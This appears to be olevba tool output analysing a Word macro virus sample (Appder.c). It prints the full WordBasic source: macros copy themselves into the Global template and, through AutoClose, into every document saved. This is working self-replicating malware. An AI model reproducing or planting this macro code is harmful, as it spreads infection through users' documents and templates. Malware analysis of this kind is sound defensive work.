olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Appder.c-1b047d091aa0e62db2c38a402ce9cdff806aac6e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Appder.c-1b047d091aa0e62db2c38a402ce9cdff806aac6e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FindVirus.bas 
in file: Virus.MSWord.Appder.c-1b047d091aa0e62db2c38a402ce9cdff806aac6e - OLE stream: 'Macros/VBA/FindVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim mt
Dim i
Dim AClose
Dim Ad
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo quit
mt = WordBasic.CountMacros(0, 0)
For i = 1 To mt
    If WordBasic.[MacroName$](i, 0, 0) = "AutoClose" Then AClose = -1
    If WordBasic.[MacroName$](i, 0, 0) = "FindVirus" Then Ad = -1
Next i
If Not AClose And Not Ad Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":FindVirus"
    WordBasic.MacroCopy sMacro$, "Global:FindVirus"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:AutoClose"
End If
For i = 1 To mt
    If UCase(WordBasic.[MacroName$](i, 0, 0)) = UCase("Appder") Then WordBasic.MsgBox "You computer have WordMacro Virus, Please Call specialist Or programmer ", " Àíõààð òàíû êîìïüþòåðò ìàêðî âèðóñ èëýðëýý, ìýðãýæèëòýíã äóóäíà óó ", 48
Next i
quit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Appder.c-1b047d091aa0e62db2c38a402ce9cdff806aac6e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo quit
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:FindVirus", sTMacro$
sTMacro$ = sMe$ + ":FindVirus"
WordBasic.MacroCopy "Global:FindVirus", sTMacro$
sTMacro$ = sMe$ + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done
quit:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
